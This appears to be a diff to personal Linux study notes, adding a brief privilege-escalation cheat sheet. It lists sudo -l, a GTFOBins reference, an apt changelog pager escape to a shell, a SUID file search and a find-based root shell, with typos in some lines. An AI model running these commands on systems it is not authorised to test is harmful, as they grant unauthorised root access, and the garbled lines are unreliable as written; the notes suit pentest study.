@@ -348,9 +348,14 @@ man init
 init --version
 ps 1
 ###
+Use apt-get to obtain root-access:
+sudo -l
+- Go to gtfobins, search for the cmds you can use
+sudo apt-gt changelog apt --> !#/bin/sh
+---
+find / -type f -perm /4000 -ls 2>/dev/null
 
-
-
+find . -exec /bin/sh -p \; -quit
 
 
            ASD
